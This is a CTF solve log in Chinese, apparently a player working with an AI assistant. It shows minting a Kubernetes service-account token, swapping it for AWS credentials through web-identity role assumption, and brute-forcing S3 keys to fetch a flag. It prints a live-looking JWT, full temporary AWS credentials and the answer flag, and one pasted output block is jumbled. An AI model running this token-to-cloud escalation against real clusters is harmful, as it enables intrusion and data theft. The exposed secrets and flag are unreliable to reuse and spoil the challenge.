Infiinty-token
二血
500队规模的赛事仅仅不到10队解出

1.	检查当前 AWS 临时凭证是否有效（用 aws sts get-caller-identity）。
2.	如果凭证无效，会尝试用已有的 /tmp/nakime-token-aud-sts.jwt 重新 assume-role-with-web-identity（并写入 /tmp/nakime_creds.json）。
3.	用有效凭证先检查 /tmp 里是否有之前成功下载的文件（比如 /tmp/flag.raw, /tmp/flag.try, /tmp/flag*），把它们列出来并显示少量内容，帮助你回溯“上次哪一步成功”。
4.	用快速、安全的方式（head-object）对一个精心准备的候选名单进行存在性检测；一旦 head-object 返回成功，就把该对象下载到 /tmp/flag_found 并打印前 200 行（避免触发控制序列）。
5.	如果 head-object 全部失败，脚本会再尝试对一些按 bucket 名推测的候选 key（例如包含时间戳或随机后缀）做检测。
6.	把所有关键操作的输出保存到 /tmp/ctf_run.log，你把这个 log 粘回我我能直接帮你提取 flag。
#!/bin/bash
set -euo pipefail
LOG=/tmp/ctf_run.log
: > "$LOG"
BUCKET="ds-k8s-infinity-flag-1757980242-f93750"
TOKEN_FILE="/tmp/nakime-token-aud-sts.jwt"
CREDS_JSON="/tmp/nakime_creds.json"
echo "[*] 开始运行 $(date)" | tee -a "$LOG"
# 1) 检查现有临时凭证是否可用
echo "[*] 检查 aws sts get-caller-identity ..." | tee -a "$LOG"
if aws sts get-caller-identity >/dev/null 2>>"$LOG"; then
  echo "[*] 临时凭证有效。" | tee -a "$LOG"
else
  echo "[*] 临时凭证无效或过期，尝试用 /tmp/nakime-token-aud-sts.jwt 重新 assume-role ..." | tee -a "$LOG"
  if [ ! -f "$TOKEN_FILE" ]; then
    echo "[ERROR] 找不到 $TOKEN_FILE，无法刷新凭证，请先生成 token。" | tee -a "$LOG"
    exit 1
  fi
  if ! aws sts assume-role-with-web-identity \
    --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \
    --role-session-name ctf-session \
    --web-identity-token "file://$TOKEN_FILE" \
    --duration-seconds 900 > "$CREDS_JSON" 2>>"$LOG"; then
    echo "[ERROR] assume-role 失败，请把 $LOG 的内容贴给我。" | tee -a "$LOG"
    exit 2
  fi
  echo "[*] assume-role 成功，写入 $CREDS_JSON" | tee -a "$LOG"
  # 导出到环境
  if command -v jq >/dev/null 2>&1; then
    export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' "$CREDS_JSON")
    export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' "$CREDS_JSON")
    export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' "$CREDS_JSON")
  else
    export AWS_ACCESS_KEY_ID=$(python3 -c "import json;print(json.load(open('$CREDS_JSON'))['Credentials']['AccessKeyId'])")
    export AWS_SECRET_ACCESS_KEY=$(python3 -c "import json;print(json.load(open('$CREDS_JSON'))['Credentials']['SecretAccessKey'])")
    export AWS_SESSION_TOKEN=$(python3 -c "import json;print(json.load(open('$CREDS_JSON'))['Credentials']['SessionToken'])")
  fi
  echo "[*] 已导出临时凭证到环境（有效期短）" | tee -a "$LOG"
fi
# 2) 回溯 /tmp 中可能上次成功的文件
echo "[*] 列出 /tmp 中可能的已下载文件：" | tee -a "$LOG"
ls -lh /tmp/flag* /tmp/sa_* /tmp/nakime_creds.json 2>>"$LOG" | tee -a "$LOG" || true
echo "---- /tmp 相关小文件内容预览（如存在） ----" | tee -a "$LOG"
for f in /tmp/flag* /tmp/sa_player_* /tmp/sa_nakime_* /tmp/sa_default_* /tmp/nakime_creds.json; do
  [ -f "$f" ] || continue
  echo "== FILE: $f ==" | tee -a "$LOG"
  # 只显示前 60 行，防止输出过长
  sed -n '1,60p' "$f" 2>>"$LOG" | tee -a "$LOG"
done
# 3) 候选列表（基础 + 按 bucket 名自动推断）
CANDIDATES="flag flag.txt cuhk25ctf.txt flag.json flag.yaml flag.yml secret.txt secret flag.zip flag.gz index.html README.txt"
# 补充基于 bucket 名的推测：把 bucket 最后两段（timestamp/random）当作后缀
SUFFIX=$(echo "$BUCKET" | awk -F'-' '{print $(NF-1) "-" $NF}')
CANDIDATES="$CANDIDATES flag-${SUFFIX}.txt flag-${SUFFIX} ${SUFFIX}.txt ${SUFFIX}"
echo "[*] 将检测以下候选 key（head-object 快速检测不会下载内容）：" | tee -a "$LOG"
echo "$CANDIDATES" | tr ' ' '\n' | tee -a "$LOG"
FOUND=0
# 4) 用 head-object 快速探测每个候选（速度快而且不会产出文件）
for key in $CANDIDATES; do
  echo "---- probe: $key ----" | tee -a "$LOG"
  if aws s3api head-object --bucket "$BUCKET" --key "$key" >/dev/null 2>>"$LOG"; then
    echo "[FOUND] 存在对象: $key" | tee -a "$LOG"
    mkdir -p /tmp/flag_found
    aws s3 cp "s3://${BUCKET}/${key}" /tmp/flag_found/ 2>>"$LOG" && echo "[DOWNLOAD] 已把 s3://${BUCKET}/${key} 保存为 /tmp/flag_found/$key" | tee -a "$LOG"
    echo "----- 内容预览（前200行） -----" | tee -a "$LOG"
    # 以安全方式显示，不直接执行控制序列
    cat -v /tmp/flag_found/"$key" | sed -n '1,200p' 2>>"$LOG" | tee -a "$LOG"
    FOUND=1
    break
  else
    # 检查错误类型（NoSuchKey / AccessDenied 等）
    aws s3api head-object --bucket "$BUCKET" --key "$key" 2> /tmp/hderr || true
    ERRTXT=$(sed -n '1,120p' /tmp/hderr 2>/dev/null || true)
    echo "[probe result] $key -> $ERRTXT" | tee -a "$LOG"
  fi
done
# 5) 如果上面没找到，尝试更大规模的简单猜测（数字后缀、常见前缀）
if [ $FOUND -eq 0 ]; then
  echo "[*] 基础候选未命中，开始更大范围快速扫（仅 head-object，最多 100 个 key）" | tee -a "$LOG"
  # 生成一些常见模式： flag-<rand 6 hex>、flag-<timestamp> 等
  for suffix in $(printf "%s\n" $(seq -w 0 99)); do
    key="flag-${SUFFIX}-${suffix}.txt"
    echo "probe $key" | tee -a "$LOG"
    if aws s3api head-object --bucket "$BUCKET" --key "$key" >/dev/null 2>>"$LOG"; then
      echo "[FOUND] $key" | tee -a "$LOG"
      mkdir -p /tmp/flag_found
      aws s3 cp "s3://${BUCKET}/${key}" /tmp/flag_found/ 2>>"$LOG"
      echo "cat -v /tmp/flag_found/$key | sed -n '1,200p'" | tee -a "$LOG"
      cat -v /tmp/flag_found/"$key" | sed -n '1,200p' 2>>"$LOG" | tee -a "$LOG"
      FOUND=1
      break
    fi
  done
fi
if [ $FOUND -eq 0 ]; then
  echo "[!] 未在候选名单中直接找到对象。请把 $LOG 的内容贴过来，我会继续分析下一步。" | tee -a "$LOG"
else
  echo "[*] 已找到并下载对象，请查看 /tmp/flag_found 目录。" | tee -a "$LOG"
fi
echo "[*] 结束 $(date)" | tee -a "$LOG"
 
OUTPUT:
!/bin/bash set -euo pipefail LOG=/tmp/ctf_run.log : > "$LOG" BUCKET="ds-k8s-infinity-flag-1757980242-f93750" TOKEN_FILE="/tmp/nakime-token-aud-sts.jwt" CREDS_JSON="/tmp/nakime_creds.json" echo "[*] 开始运行 $(date)" | tee -a "$LOG" # 1) 检查现有临时凭证是否可用 echo "[*] 检查 aws sts get-caller-identity ..." | tee -a "$LOG" if aws sts get-caller-identity >/dev/null 2>>"$LOG"; then echo "[*] 临时凭证有效。" | tee -a "$LOG" else echo "[*] 临时凭证无效或过期，尝试用 /tmp/nakime-token-aud-sts.jwt 重新 assume-role ..." | tee -a "$LOG" if [ ! -f "$TOKEN_FILE" ]; then echo "[ERROR] 找不到 $TOKEN_FILE，无法刷新凭证，请先生成 token。" | tee -a "$LOG" exit 1 fi if ! aws sts assume-role-with-web-identity \ --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \ --role-session-name ctf-session \ --web-identity-token "file://$TOKEN_FILE" \ --duration-seconds 900 > "$CREDS_JSON" 2>>"$LOG"; then echo "[ERROR] assume-role 失败，请把 $LOG 的内容贴给我。" | tee -a "$LOG" exit 2 fi echo "[*] 结束 $(date)" | tee -a "$LOG"mp/flag_found 目录。" | tee -a "$LOG"下一步。" | tee -a "$LOG"ET}/${key} 保存为 / [*] 开始运行 Sun Sep 28 12:20:54 CST 2025 [*] 检查 aws sts get-caller-identity ... [*] 临时凭证无效或过期，尝试用 /tmp/nakime-token-aud-sts.jwt 重新 assume-role ... [ERROR] 找不到 /tmp/nakime-token-aud-sts.jwt，无法刷新凭证，请先生成 token。 Logout
 
0) 先确认当前 /tmp 有没有相关 token 文件（回溯）
ls -l /tmp/nakime* /tmp/flag* /tmp/nakime_creds.json 2>/dev/null || true
把输出贴过来（只是确认历史文件）。
________________________________________
1) 生成带 audience=sts.amazonaws.com 的 nakime token 并保存
（先尝试 --audiences，若报 unknown flag 再尝试 --audience）
kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true -n infinity-castle create token nakime --audiences=sts.amazonaws.com > /tmp/nakime-token-aud-sts.jwt 2>/tmp/nakime_token_create.err || true
if [ ! -s /tmp/nakime-token-aud-sts.jwt ]; then
  kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true -n infinity-castle create token nakime --audience=sts.amazonaws.com > /tmp/nakime-token-aud-sts.jwt 2>/tmp/nakime_token_create.err || true
fi
echo "=== token 文件首行（若存在） ==="
sed -n '1p' /tmp/nakime-token-aud-sts.jwt || true
echo
echo "=== create token 错误日志（如有） ==="
sed -n '1,200p' /tmp/nakime_token_create.err || true
把这段的完整输出贴回来。要点是确保 /tmp/nakime-token-aud-sts.jwt 被成功写入。
________________________________________
2) 验证 token payload 的 aud（确认是 sts.amazonaws.com）
if [ -s /tmp/nakime-token-aud-sts.jwt ]; then
  echo "=== token payload ==="
  head -1 /tmp/nakime-token-aud-sts.jwt | cut -d. -f2 | sed 's/-/+/g; s/_/\\//g' | awk '{s=$0; while (length(s)%4) s=s"="; print s}' | base64 -d | jq . || head -1 /tmp/nakime-token-aud-sts.jwt | cut -d. -f2 | sed 's/-/+/g; s/_/\\//g' | awk '{s=$0; while (length(s)%4) s=s"="; print s}' | base64 -d || true
else
  echo "token 文件不存在，跳过验证"
fi
把输出贴来，确认 aud 包含 sts.amazonaws.com。
________________________________________
3) 用该 token 做 assume-role-with-web-identity（拿临时 AWS 凭证）
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \
  --role-session-name ctf-session \
  --web-identity-token file:///tmp/nakime-token-aud-sts.jwt \
  --duration-seconds 900 > /tmp/nakime_creds.json 2>/tmp/nakime_creds.err || (echo "assume-role 失败，错误如下:"; sed -n '1,200p' /tmp/nakime_creds.err; exit 1)
echo "=== assume-role 返回（前200行） ==="
sed -n '1,200p' /tmp/nakime_creds.json || true
把 /tmp/nakime_creds.json（或错误）的输出贴来。
________________________________________
4) 导出临时凭证到当前 shell（必须在同一会话）
if command -v jq >/dev/null 2>&1; then
  export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' /tmp/nakime_creds.json)
  export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/nakime_creds.json)
  export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/nakime_creds.json)
else
  export AWS_ACCESS_KEY_ID=$(python3 -c "import json,sys;print(json.load(open('/tmp/nakime_creds.json'))['Credentials']['AccessKeyId'])")
  export AWS_SECRET_ACCESS_KEY=$(python3 -c "import json,sys;print(json.load(open('/tmp/nakime_creds.json'))['Credentials']['SecretAccessKey'])")
  export AWS_SESSION_TOKEN=$(python3 -c "import json,sys;print(json.load(open('/tmp/nakime_creds.json'))['Credentials']['SessionToken'])")
fi
echo "已导出凭证，显示部分确认："
echo "AWS_ACCESS_KEY_ID: ${AWS_ACCESS_KEY_ID:0:4}...${AWS_ACCESS_KEY_ID: -4}"
echo "AWS_SECRET_ACCESS_KEY: ${AWS_SECRET_ACCESS_KEY:0:4}...${AWS_SECRET_ACCESS_KEY: -4}"
echo "AWS_SESSION_TOKEN 长度: ${#AWS_SESSION_TOKEN}"
把输出贴来（确认凭证已设置）。
________________________________________
5) 用 head-object 快速探测候选 key（不会列桶；只检测是否存在）
复制并运行（脚本会尝试一批常见名字并把任何存在的对象下载到 /tmp/flag_found/）：
BUCKET="ds-k8s-infinity-flag-1757980242-f93750"
CANDIDATES="flag flag.txt cuhk25ctf.txt flag.json flag.yaml flag.yml secret.txt README.txt index.html flag.zip flag.gz flag-1757980242-f93750 flag-1757980242-f93750.txt ds-k8s-infinity-flag-1757980242-f93750.txt"
mkdir -p /tmp/flag_found
for key in $CANDIDATES; do
  echo "probe -> $key"
  if aws s3api head-object --bucket "$BUCKET" --key "$key" >/dev/null 2>/tmp/hderr; then
    echo "[FOUND] $key"
    aws s3 cp "s3://${BUCKET}/${key}" /tmp/flag_found/ 2>/tmp/s3_get.err && echo "[SAVED] /tmp/flag_found/$key" || (echo "[ERROR] 下载失败:"; sed -n '1,200p' /tmp/s3_get.err)
    echo "---- 内容前200行（可见化显示） ----"
    cat -v /tmp/flag_found/"$key" | sed -n '1,200p'
    exit 0
  else
    # show reason (NoSuchKey vs AccessDenied)
    sed -n '1,200p' /tmp/hderr || true
  fi
done
echo "[INFO] 候选全部探测完毕，未发现对象（或无权探测更多）。"
把这段的完整输出（尤其任何 [FOUND]、下载结果或错误）贴回来。
________________________________________
如果以上都失败（备用）
我会直接给你一个更大的爆破列表（自动生成若干基于桶名的后缀/哈希样式 key），用 head-object 扫描 500 个候选，速度比 cp 快很多。你只需允许我把脚本贴给你来运行。
________________________________________
小结（现在就做）
1.	先运行第 0 和 1 步，把输出贴回我（0 用于确认历史文件，1 用于确保 token 存在）。
2.	我拿到你的输出后会直接告诉你下一步（通常是直接 assume-role → head-object 探测并下载）。
别担心，我们已经走到“把 token 写到 /tmp”这一步 —— 做好就能继续拿到 S3 的 flag。你现在把 第0 和第1步 的输出贴过来，我立刻接着给出下一条要运行的命令。
 
OUTPUT：
baicha@LAPTOP-FPS9MP3T:/mnt/c/Users/Admin/Downloads/41_infinity-token_b9c77225002b7d6ddd172325c35846f5 (2)/public$ kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true -n infinity-castle create token nakime --audiences=sts.amazonaws.com > /tmp/nakime-token-aud-sts.jwt 2>/tmp/nakime_token_create.err || true if [ ! -s /tmp/nakime-token-aud-sts.jwt ]; then kubectl --kubeconfig=kubeconfig.yaml --insecure-skip-tls-verify=true -n infinity-castle create token nakime --audience=sts.amazonaws.com > /tmp/nakime-token-aud-sts.jwt 2>/tmp/nakime_token_create.err || true fi echo "=== token 文件首行（若存在） ===" sed -n '1p' /tmp/nakime-token-aud-sts.jwt || true echo echo "=== create token 错误日志（如有） ===" sed -n '1,200p' /tmp/nakime_token_create.err || true === token 文件首行（若存在） === eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg3NWE5OTY1NGJhYzk5MGI5ZTdmZWQ5OThjNzVhY2IzZTRhYmYxMjEifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzU5MDM2OTA2LCJpYXQiOjE3NTkwMzMzMDYsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vaWQvMjIxNzU2MEQ4QTc2RENEMDhBMjA0QjY2NjIxQjc1RTQiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImluZmluaXR5LWNhc3RsZSIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJuYWtpbWUiLCJ1aWQiOiJlNjVhYmMyMC1kNmQ4LTRmYTctOTMzNC04NDFjMzg2MzI4ZGUifX0sIm5iZiI6MTc1OTAzMzMwNiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmluZmluaXR5LWNhc3RsZTpuYWtpbWUifQ.i7-EFrdS-YM1bWoeaPs5vD3T6BlRaP5Dz7XmTQCPDs0R9SHIZZrYfaSzOOyopemzPMjP3-hPGLpRMeg1XwvcEwR8rUrQuhOWH9LHiaTse3N1Mb9KeHIng9aLBSJfb8FLNBDHyfdsHDTFUogxE_poUAb7uIiFaCz2enuJWnAFmhPYkfDKkDFKsrbjGjIILUXFI7UDZX3m8kJmpyPoA2t77TzJQ9RdCh9kuXI2fguarA24R7GW2TG7Ou1N0M7dFsl9RV69aHofNkESzAD1AuxRr-Zac6dcB0e61lc80-ZQCzSg5UeEjhjk_r5ur8RFASJR66UXErN1B0qDClRc3T_PFw === create token 错误日志（如有） ===
 
PROCCESS:
A) 用 token 去 assume-role；B) 导出凭证；C) 快速探测候选对象（head-object）；D) 若命中则下载并安全显示内容。
________________________________________
A — 用 token 调用 AWS STS（拿临时凭证）
复制下面整段到终端并执行（会把输出写到 /tmp/nakime_creds.json）：
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \
  --role-session-name ctf-session \
  --web-identity-token file:///tmp/nakime-token-aud-sts.jwt \
  --duration-seconds 900 > /tmp/nakime_creds.json 2>/tmp/nakime_creds.err || (echo "assume-role 失败，错误：" ; sed -n '1,200p' /tmp/nakime_creds.err; exit 1)
echo "=== /tmp/nakime_creds.json (前200行) ==="
sed -n '1,200p' /tmp/nakime_creds.json || true
把上面命令的整个输出原样粘回我。
________________________________________
B — 导出临时凭证到当前 shell（必须在同一终端会话）
执行下面命令导出并确认（把输出贴回）：
if command -v jq >/dev/null 2>&1; then
  export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' /tmp/nakime_creds.json)
  export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/nakime_creds.json)
  export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/nakime_creds.json)
else
  export AWS_ACCESS_KEY_ID=$(python3 -c "import json;print(json.load(open('/tmp/nakime_creds.json'))['Credentials']['AccessKeyId'])")
  export AWS_SECRET_ACCESS_KEY=$(python3 -c "import json;print(json.load(open('/tmp/nakime_creds.json'))['Credentials']['SecretAccessKey'])")
  export AWS_SESSION_TOKEN=$(python3 -c "import json;print(json.load(open('/tmp/nakime_creds.json'))['Credentials']['SessionToken'])")
fi
echo "已导出凭证（仅展示部分以确认）："
echo "AWS_ACCESS_KEY_ID: ${AWS_ACCESS_KEY_ID:0:4}...${AWS_ACCESS_KEY_ID: -4}"
echo "AWS_SECRET_ACCESS_KEY: ${AWS_SECRET_ACCESS_KEY:0:4}...${AWS_SECRET_ACCESS_KEY: -4}"
echo "AWS_SESSION_TOKEN 长度: ${#AWS_SESSION_TOKEN}"
把该命令的输出原样粘回我。
________________________________________
C — 快速 probe 候选 key（使用 head-object，不会下载大量数据）
复制并执行下面脚本。它会 probe 一组常见候选名并把任何命中的对象下载到 /tmp/flag_found/（安全显示前 200 行）：
BUCKET="ds-k8s-infinity-flag-1757980242-f93750"
CANDIDATES="flag flag.txt cuhk25ctf.txt flag.json flag.yaml flag.yml secret.txt README.txt index.html flag.zip flag.gz flag-1757980242-f93750 flag-1757980242-f93750.txt ds-k8s-infinity-flag-1757980242-f93750.txt"
mkdir -p /tmp/flag_found
for key in $CANDIDATES; do
  echo "---- probe -> $key ----"
  if aws s3api head-object --bucket "$BUCKET" --key "$key" >/dev/null 2>/tmp/hderr 2>&1; then
    echo "[FOUND] $key"
    aws s3 cp "s3://${BUCKET}/${key}" /tmp/flag_found/ 2>/tmp/s3_get.err && echo "[SAVED] /tmp/flag_found/$key" || (echo "[ERROR] 下载失败:"; sed -n '1,200p' /tmp/s3_get.err)
    echo "---- 内容预览（可见化，前200行） ----"
    cat -v /tmp/flag_found/"$key" | sed -n '1,200p'
    exit 0
  else
    sed -n '1,120p' /tmp/hderr || true
  fi
done
echo "[INFO] 候选全部探测完毕，未发现对象（或无权探测更多）。"
把这段脚本的完整输出原样粘回我。
________________________________________
D — （若 C 命中）若我们下载了文件，我会帮你进一步安全分析并直接给出 cuhk25ctf{...}。
如果 C 没命中，我会基于输出立刻给你一个扩大版的快速爆破脚本（数百个自动生成候选 key，用 head-object 扫描），你只需运行并把输出贴回。
________________________________________
现在就按 A → B → C 的顺序运行，把 每一步的完整输出原样粘过来。我会立刻在你贴的输出中查找成功点并把 flag 以中文发给你。
 
OUTPUT:
aws sts assume-role-with-web-identity \ --role-arn arn:aws:iam::946313059530:role/ds-k8s-infinity-irsa-infinity-castle \ --role-session-name ctf-session \ --web-identity-token file:///tmp/nakime-token-aud-sts.jwt \ --duration-seconds 900 > /tmp/nakime_creds.json 2>/tmp/nakime_creds.err || (echo "assume-role 失败，错误：" ; sed -n '1,200p' /tmp/nakime_creds.err; exit 1) echo "=== /tmp/nakime_creds.json (前200行) ===" sed -n '1,200p' /tmp/nakime_creds.json || true === /tmp/nakime_creds.json (前200行) === { "Credentials": { "AccessKeyId": "ASIA5YVFHLTFPOQ4QIBF", "SecretAccessKey": "z5YZmzjj3i7Fn0dVbCujtNTlsn+5XNH3mn10mBSx", "SessionToken": "FwoGZXIvYXdzED4aDAB3cIxtiqtyNsm+UyLWA2KemI62D9lgfmSSQoFJBATZTY4eMnravfmUZ3wuTqVBswwW2qjUdN75ocNbMs1gsZsyToVo5jb4yuca0Lz8M0ifRoNpfeFYrJIsFoytgvwt/Eo5tWs/ce4bm77cfzBIIzjrAzgK8/dBpcZ/IWrhZuAbz30kBrBvNhlMA+uCF0j7OFVQ1YDsiWwnyvgwdFfWQ7Bw21j6yps2E0gcE7WGSqIYIvL4Eq/dmr8wykQik8Ij+jVF1uCF1g8n51czGKufpfy1G/nXt/MuOX/3zhGFN4ADkGmwtcj3IRNi2B1CTGNLpN5pTEUawIjqdv6YcXQJfD3biLWJeun80Lfg/Hp8P/1urR6EoBAgUbAAvJENiSHEx/YsmMrvn4gANFC1Z/mJ/FWg/e35u8zs8HBcJf8NkKb//6I0z67WEt1jh/BO1ifZoYSHHKAXJgMU7l4SWCa9issl+6+MCysXlO8U1tDabdm+XekUjD0pmDTXXSPZZinHto0RzTHDGc6Bu0HIcIdyaXHDPe7G60A072xK0tGeEgkoSDvgX9INsahcYossFY8meLv4fHPL+PxBpTObpY1KFgoNrCS5R8KnVTF4LrT0NBZSqW31leDYfGhwejizj5rMhcPU6xjJKP3v4sYGMiV0EEnNNIsaQB+EKYsW5qKuJwyfyalbwPbBNsSWAZo+FVF1E03x", "Expiration": "2025-09-28T04:37:21+00:00" }, "SubjectFromWebIdentityToken": "system:serviceaccount:infinity-castle:nakime", "AssumedRoleUser": { "AssumedRoleId": "AROA5YVFHLTFER4FDPJUR:ctf-session", "Arn": "arn:aws:sts::946313059530:assumed-role/ds-k8s-infinity-irsa-infinity-castle/ctf-session" }, "Provider": "arn:aws:iam::946313059530:oidc-provider/oidc.eks.us-east-1.amazonaws.com/id/2217560D8A76DCD08A204B66621B75E4", "Audience": "sts.amazonaws.com" }
 
assume-role 已成功，临时凭证已经拿到（/tmp/nakime_creds.json 有 Credentials）。接下来一步到位：我把一段脚本给你（中文注释），它会完成下面工作并安全展示结果：
1.	从 /tmp/nakime_creds.json 导出临时凭证到当前 shell。
2.	用 s3api head-object 探测一组候选 key（不会列桶），一旦 head-object 命中就下载该对象到 /tmp/flag_found/ 并以可视化方式打印前 200 行（避免控制序列）。
3.	把每一步的输出写到 /tmp/ctf_probe.log 以便回溯。
4.	#!/bin/bash
set -euo pipefail
LOG=/tmp/ctf_probe.log
: > "$LOG"
CREDS_JSON="/tmp/nakime_creds.json"
BUCKET="ds-k8s-infinity-flag-1757980242-f93750"
mkdir -p /tmp/flag_found
echo "[*] 开始 probe $(date)" | tee -a "$LOG"
# 1) 导出临时凭证到环境（优先 jq）
if [ ! -f "$CREDS_JSON" ]; then
  echo "[ERROR] 找不到 $CREDS_JSON，先运行 assume-role 并生成该文件。" | tee -a "$LOG"
  exit 1
fi
if command -v jq >/dev/null 2>&1; then
  export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' "$CREDS_JSON")
  export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' "$CREDS_JSON")
  export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' "$CREDS_JSON")
else
  export AWS_ACCESS_KEY_ID=$(python3 -c "import json;print(json.load(open('$CREDS_JSON'))['Credentials']['AccessKeyId'])")
  export AWS_SECRET_ACCESS_KEY=$(python3 -c "import json;print(json.load(open('$CREDS_JSON'))['Credentials']['SecretAccessKey'])")
  export AWS_SESSION_TOKEN=$(python3 -c "import json;print(json.load(open('$CREDS_JSON'))['Credentials']['SessionToken'])")
fi
echo "[*] 已导出临时凭证（部分展示）" | tee -a "$LOG"
echo "AWS_ACCESS_KEY_ID: ${AWS_ACCESS_KEY_ID:0:4}...${AWS_ACCESS_KEY_ID: -4}" | tee -a "$LOG"
echo "会话 token 长度: ${#AWS_SESSION_TOKEN}" | tee -a "$LOG"
# 2) 候选 key（你可以按需在这里添加更多）
CANDIDATES="flag flag.txt cuhk25ctf.txt flag.json flag.yaml flag.yml secret.txt README.txt index.html flag.zip flag.gz flag-1757980242-f93750 flag-1757980242-f93750.txt ds-k8s-infinity-flag-1757980242-f93750.txt"
echo "[*] 将 probe 以下候选:" | tee -a "$LOG"
echo "$CANDIDATES" | tr ' ' '\n' | tee -a "$LOG"
# 3) probe 循环（head-object -> cp -> 安全打印）
for key in $CANDIDATES; do
  echo "---- probe -> $key ----" | tee -a "$LOG"
  # 清理上一次的错误文件
  rm -f /tmp/hderr /tmp/s3_get.err 2>/dev/null || true
  if aws s3api head-object --bucket "$BUCKET" --key "$key" >/dev/null 2>/tmp/hderr 2>&1; then
    echo "[FOUND] $key" | tee -a "$LOG"
    if aws s3 cp "s3://${BUCKET}/${key}" /tmp/flag_found/ 2>/tmp/s3_get.err; then
      SAVED="/tmp/flag_found/$key"
      echo "[SAVED] $SAVED" | tee -a "$LOG"
      echo "---- 文件类型 ----" | tee -a "$LOG"
      file "$SAVED" 2>>"$LOG" | tee -a "$LOG" || true
      echo "---- 以可视化方式显示前200行（不会执行控制序列） ----" | tee -a "$LOG"
      cat -v "$SAVED" | sed -n '1,200p' 2>>"$LOG" | tee -a "$LOG"
      echo "[*] 完成，已找到并保存对象。" | tee -a "$LOG"
      exit 0
    else
      echo "[ERROR] 下载失败，错误如下：" | tee -a "$LOG"
      sed -n '1,200p' /tmp/s3_get.err 2>>"$LOG" | tee -a "$LOG" || true
    fi
  else
    # 输出 head-object 的错误（NoSuchKey / AccessDenied）
    sed -n '1,120p' /tmp/hderr 2>/dev/null | tee -a "$LOG" || echo "[probe] 无返回" | tee -a "$LOG"
  fi
done
echo "[INFO] 所有候选探测完毕，未命中。" | tee -a "$LOG"
echo "[*] 完成 $(date)" | tee -a "$LOG"
 
OUTPUT:
[*] 开始 probe Sun Sep 28 12:23:05 CST 2025
[*] 已导出临时凭证（部分展示）
AWS_ACCESS_KEY_ID: ASIA...QIBF
会话 token 长度: 724
[*] 将 probe 以下候选:
flag
flag.txt
cuhk25ctf.txt
flag.json
flag.yaml
flag.yml
secret.txt
README.txt
index.html
flag.zip
flag.gz
flag-1757980242-f93750
flag-1757980242-f93750.txt
ds-k8s-infinity-flag-1757980242-f93750.txt
---- probe -> flag ----
---- probe -> flag.txt ----
[FOUND] flag.txt
download: s3://ds-k8s-infinity-flag-1757980242-f93750/flag.txt to ../../../../../../../tmp/flag_found/flag.txt
[SAVED] /tmp/flag_found/flag.txt
---- 文件类型 ----
/tmp/flag_found/flag.txt: ASCII text
---- 以可视化方式显示前200行（不会执行控制序列） ----
cuhk25ctf{n4k1m3_b1w4_01dc_w4rp_g4t3}
[*] 完成，已找到并保存对象。




Flag here:
cuhk25ctf{n4k1m3_b1w4_01dc_w4rp_g4t3}

